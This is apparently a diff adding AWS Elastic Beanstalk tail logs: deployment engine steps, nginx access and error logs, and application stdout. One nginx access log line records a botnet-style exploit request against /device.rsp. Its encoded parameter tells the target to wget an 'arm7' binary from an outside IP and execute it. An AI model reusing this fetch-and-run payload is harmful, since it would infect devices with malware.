@@ -1,0 +1,333 @@
+Retrieving logs...
+============= i-080b5e528984588fb ==============
+----------------------------------------
+/var/log/eb-engine.log
+----------------------------------------
+2025/02/22 05:33:57.595342 [INFO] Running command: systemctl show -p PartOf xray.service
+2025/02/22 05:33:57.607231 [WARN] stopProcess Warning: process xray is not registered 
+2025/02/22 05:33:57.607256 [INFO] Running command: systemctl stop xray.service
+2025/02/22 05:33:57.619388 [INFO] Executing instruction: stop proxy
+2025/02/22 05:33:57.619413 [INFO] Running command: systemctl show -p PartOf httpd.service
+2025/02/22 05:33:57.635357 [WARN] deregisterProcess Warning: process httpd is not registered, skipping...
+
+2025/02/22 05:33:57.635579 [INFO] Running command: systemctl show -p PartOf nginx.service
+2025/02/22 05:33:57.649883 [INFO] Running command: systemctl is-active nginx.service
+2025/02/22 05:33:57.659093 [INFO] Running command: systemctl show -p PartOf nginx.service
+2025/02/22 05:33:57.668782 [INFO] Running command: systemctl stop nginx.service
+2025/02/22 05:33:57.922703 [INFO] Running command: systemctl disable nginx.service
+2025/02/22 05:33:58.227826 [INFO] Running command: systemctl daemon-reload
+2025/02/22 05:33:58.531403 [INFO] Running command: systemctl reset-failed
+2025/02/22 05:33:58.544442 [INFO] Executing instruction: FlipApplication
+2025/02/22 05:33:58.544465 [INFO] Fetching environment variables...
+2025/02/22 05:33:58.544481 [INFO] setting default port 8080 to application
+2025/02/22 05:33:58.544716 [INFO] Purge old process...
+2025/02/22 05:33:58.544867 [INFO] Running command: systemctl stop eb-app.target
+2025/02/22 05:33:58.567476 [INFO] Running command: systemctl show -p ConsistsOf eb-app.target | cut -d= -f2
+2025/02/22 05:33:58.661383 [INFO] web.service
+
+2025/02/22 05:33:58.661410 [INFO] deregistering process: web
+2025/02/22 05:33:58.661420 [INFO] Running command: systemctl show -p PartOf web.service
+2025/02/22 05:33:58.681937 [INFO] Running command: systemctl is-active web.service
+2025/02/22 05:33:58.693837 [INFO] Running command: systemctl disable web.service
+2025/02/22 05:33:59.084094 [INFO] Removed "/etc/systemd/system/multi-user.target.wants/web.service".
+
+2025/02/22 05:33:59.084398 [INFO] Running command: systemctl daemon-reload
+2025/02/22 05:33:59.436174 [INFO] Running command: systemctl reset-failed
+2025/02/22 05:33:59.454101 [INFO] Running command: systemctl is-active web.service
+2025/02/22 05:33:59.478223 [INFO] Process web has been fully terminated
+2025/02/22 05:33:59.478246 [INFO] All processes have been fully terminated
+2025/02/22 05:33:59.478250 [INFO] Removing /var/app/current/ if it exists
+2025/02/22 05:33:59.527464 [INFO] Renaming /var/app/staging/ to /var/app/current/
+2025/02/22 05:33:59.527497 [INFO] Register application processes...
+2025/02/22 05:33:59.527502 [INFO] Registering the proc: web
+
+2025/02/22 05:33:59.527514 [INFO] Running command: systemctl show -p PartOf web.service
+2025/02/22 05:33:59.546653 [INFO] Running command: systemctl daemon-reload
+2025/02/22 05:33:59.922814 [INFO] Running command: systemctl reset-failed
+2025/02/22 05:33:59.940407 [INFO] Running command: systemctl is-enabled eb-app.target
+2025/02/22 05:33:59.948445 [INFO] Running command: systemctl enable eb-app.target
+2025/02/22 05:34:00.405789 [INFO] Running command: systemctl start eb-app.target
+2025/02/22 05:34:00.415927 [INFO] Running command: systemctl enable web.service
+2025/02/22 05:34:00.758061 [INFO] Created symlink /etc/systemd/system/multi-user.target.wants/web.service → /etc/systemd/system/web.service.
+
+2025/02/22 05:34:00.758105 [INFO] Running command: systemctl show -p PartOf web.service
+2025/02/22 05:34:00.773065 [INFO] Running command: systemctl is-active web.service
+2025/02/22 05:34:00.783469 [INFO] Running command: systemctl start web.service
+2025/02/22 05:34:00.838962 [INFO] Executing instruction: start X-Ray
+2025/02/22 05:34:00.838981 [INFO] X-Ray is not enabled.
+2025/02/22 05:34:00.838997 [INFO] Executing instruction: start proxy with new configuration
+2025/02/22 05:34:00.839019 [INFO] Running command: /usr/sbin/nginx -t -c /var/proxy/staging/nginx/nginx.conf
+2025/02/22 05:34:00.871427 [INFO] nginx: [warn] could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+nginx: the configuration file /var/proxy/staging/nginx/nginx.conf syntax is ok
+nginx: configuration file /var/proxy/staging/nginx/nginx.conf test is successful
+
+2025/02/22 05:34:00.871730 [INFO] Running command: cp -rp /var/proxy/staging/nginx/* /etc/nginx
+2025/02/22 05:34:00.876523 [INFO] Running command: systemctl show -p PartOf nginx.service
+2025/02/22 05:34:00.903680 [INFO] Running command: systemctl daemon-reload
+2025/02/22 05:34:01.475851 [INFO] Running command: systemctl reset-failed
+2025/02/22 05:34:01.490852 [INFO] Running command: systemctl show -p PartOf nginx.service
+2025/02/22 05:34:01.517042 [INFO] Running command: systemctl is-active nginx.service
+2025/02/22 05:34:01.531993 [INFO] Running command: systemctl start nginx.service
+2025/02/22 05:34:01.714675 [INFO] Executing instruction: configureSqsd
+2025/02/22 05:34:01.714695 [INFO] This is a web server environment instance, skip configure sqsd daemon ...
+2025/02/22 05:34:01.714703 [INFO] Executing instruction: startSqsd
+2025/02/22 05:34:01.714778 [INFO] This is a web server environment instance, skip start sqsd daemon ...
+2025/02/22 05:34:01.714783 [INFO] Executing instruction: Track pids in healthd
+2025/02/22 05:34:01.714787 [INFO] This is an enhanced health env...
+2025/02/22 05:34:01.714799 [INFO] Running command: systemctl show -p ConsistsOf aws-eb.target | cut -d= -f2
+2025/02/22 05:34:01.732664 [INFO] healthd.service nginx.service cfn-hup.service
+
+2025/02/22 05:34:01.732711 [INFO] Running command: systemctl show -p ConsistsOf eb-app.target | cut -d= -f2
+2025/02/22 05:34:01.751034 [INFO] web.service
+
+2025/02/22 05:34:01.751520 [INFO] Executing instruction: RunConfigDeployPostDeployHooks
+2025/02/22 05:34:01.751609 [INFO] Executing platform hooks in .platform/confighooks/postdeploy/
+2025/02/22 05:34:01.751630 [INFO] The dir .platform/confighooks/postdeploy/ does not exist
+2025/02/22 05:34:01.751634 [INFO] Finished running scripts in /var/app/current/.platform/confighooks/postdeploy
+2025/02/22 05:34:01.751641 [INFO] Executing cleanup logic
+2025/02/22 05:34:01.751817 [INFO] CommandService Response: {"status":"SUCCESS","api_version":"1.0","results":[{"status":"SUCCESS","msg":"Engine execution has succeeded.","returncode":0,"events":[{"msg":"Instance deployment completed successfully.","timestamp":1740202441751,"severity":"INFO"}]}]}
+
+2025/02/22 05:34:01.752064 [INFO] Platform Engine finished execution on command: config-deploy
+
+2025/02/22 06:31:09.627972 [INFO] Starting...
+2025/02/22 06:31:09.628020 [INFO] Starting EBPlatform-PlatformEngine
+2025/02/22 06:31:09.628041 [INFO] reading event message file
+2025/02/22 06:31:09.628309 [INFO] Engine received EB command cfn-hup-exec
+
+2025/02/22 06:31:09.701891 [INFO] Running command: /opt/aws/bin/cfn-get-metadata -s arn:aws:cloudformation:us-east-1:539247450358:stack/awseb-e-8ky62mgmmp-stack/cf0ed870-f0dd-11ef-9175-125981b3c83d -r AWSEBAutoScalingGroup --region us-east-1
+2025/02/22 06:31:10.075495 [INFO] Running command: /opt/aws/bin/cfn-get-metadata -s arn:aws:cloudformation:us-east-1:539247450358:stack/awseb-e-8ky62mgmmp-stack/cf0ed870-f0dd-11ef-9175-125981b3c83d -r AWSEBBeanstalkMetadata --region us-east-1
+2025/02/22 06:31:10.428206 [INFO] checking whether command tail-log is applicable to this instance...
+2025/02/22 06:31:10.428224 [INFO] this command is applicable to the instance, thus instance should execute command
+2025/02/22 06:31:10.428228 [INFO] Engine command: (tail-log)
+
+2025/02/22 06:31:10.428285 [INFO] Executing instruction: GetTailLogs
+2025/02/22 06:31:10.428290 [INFO] Tail Logs...
+2025/02/22 06:31:10.429066 [INFO] Running command: tail -n 100 /var/log/eb-engine.log
+
+
+----------------------------------------
+/var/log/eb-hooks.log
+----------------------------------------
+
+
+----------------------------------------
+/var/log/nginx/access.log
+----------------------------------------
+172.31.27.175 - - [22/Feb/2025:06:19:01 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:19:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:19:16 +0000] "GET / HTTP/1.1" 404 345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "193.68.89.10"
+172.31.27.175 - - [22/Feb/2025:06:19:16 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:19:21 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:19:31 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:19:36 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:19:46 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:19:51 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:20:01 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:20:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:20:16 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:20:21 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:20:31 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:20:36 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:20:46 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:20:51 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:21:01 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:21:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:21:16 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:21:21 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:21:31 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:21:36 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:21:46 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:21:51 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:22:01 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:22:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:22:16 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:22:21 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:22:31 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:22:36 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:22:46 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:22:51 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:23:01 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:23:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:23:16 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:23:21 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:23:31 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:23:36 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:23:46 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:23:51 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:24:01 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:24:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:24:16 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:24:21 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:24:31 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:24:36 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:24:46 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:24:51 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:25:01 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:25:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:25:16 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:25:21 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:25:31 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:25:36 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:25:46 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:25:51 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:26:02 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:26:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:26:17 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:26:21 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:26:32 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:26:36 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:26:47 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:26:51 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:27:02 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:27:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:27:17 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:27:21 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:27:32 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:27:36 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:27:47 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:27:51 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:28:02 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:28:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:28:17 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:28:21 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:28:32 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:28:36 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:28:47 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:28:51 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:29:02 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:29:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:29:17 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:29:21 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:29:32 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:29:36 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:29:47 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:29:51 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.124%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 345 "-" "Mozila/5.0" "91.224.92.10"
+172.31.42.16 - - [22/Feb/2025:06:29:51 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:30:02 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:30:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:30:17 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:30:21 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:30:32 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:30:36 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:30:47 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:30:51 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.27.175 - - [22/Feb/2025:06:31:02 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+172.31.42.16 - - [22/Feb/2025:06:31:06 +0000] "GET / HTTP/1.1" 404 345 "-" "ELB-HealthChecker/2.0" "-"
+
+
+----------------------------------------
+/var/log/nginx/error.log
+----------------------------------------
+2025/02/22 05:31:23 [warn] 2272#2272: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2025/02/22 05:31:23 [warn] 2322#2322: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2025/02/22 05:31:24 [warn] 2323#2323: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2025/02/22 05:34:00 [warn] 2928#2928: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2025/02/22 05:34:01 [warn] 2977#2977: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2025/02/22 05:34:01 [warn] 2979#2979: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+
+
+----------------------------------------
+/var/log/web.stdout.log
+----------------------------------------
+Feb 22 06:19:01 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:19:06 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:19:16 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:19:16 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:19:21 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:19:31 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:19:36 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:19:46 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:19:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:20:01 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:20:06 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:20:16 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:20:21 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:20:31 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:20:36 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:20:46 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:20:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:21:01 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:21:06 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:21:16 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:21:21 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:21:31 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:21:36 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:21:46 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:21:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:22:01 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:22:06 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:22:16 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:22:21 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:22:31 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:22:36 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:22:46 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:22:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:23:01 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:23:06 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:23:16 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:23:21 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:23:31 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:23:36 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:23:46 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:23:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:24:01 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:24:06 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:24:16 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:24:21 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:24:31 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:24:36 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:24:46 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:24:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:25:01 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:25:06 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:25:16 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:25:21 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:25:31 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:25:36 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:25:46 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:25:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:26:02 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:26:06 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:26:17 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:26:21 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:26:32 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:26:36 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:26:47 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:26:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:27:02 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:27:06 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:27:17 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:27:21 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:27:32 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:27:36 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:27:47 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:27:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:28:02 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:28:06 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:28:17 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:28:21 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:28:32 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:28:36 ip-172-31-40-166 web[2968]: Middleware Executed
